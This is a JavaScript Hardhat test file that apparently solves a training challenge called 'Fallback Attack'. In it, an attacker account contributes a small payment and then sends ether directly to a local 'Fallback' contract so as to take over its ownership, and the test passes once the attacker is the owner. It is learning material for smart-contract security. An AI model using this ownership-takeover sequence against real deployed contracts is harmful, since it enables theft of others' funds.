const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] Fallback Attack', function () {

    let deployer, attacker;
    let baseContract, attackContract;
    let provider;
    let payment;

    before(async function () {
        /** SETUP SCENARIO */
        [deployer, attacker] = await ethers.getSigners();

        const baseContractFactory = await ethers.getContractFactory('Fallback', deployer);
        baseContract = await baseContractFactory.deploy();
        provider = hre.ethers.provider;
        payment = hre.ethers.utils.parseEther('0.0001');

        await baseContract.deployed();

        expect(
            await baseContract.owner()
        ).to.be.equal(deployer.address);
    });

    it('Exploit Fallback Attack', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await baseContract.connect(attacker).contribute({value: payment});
        const transactionHash1 = await attacker.sendTransaction({
            to: baseContract.address,
            value: payment
        });
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(
            await baseContract.owner()
        ).to.be.equal(attacker.address);

    });
});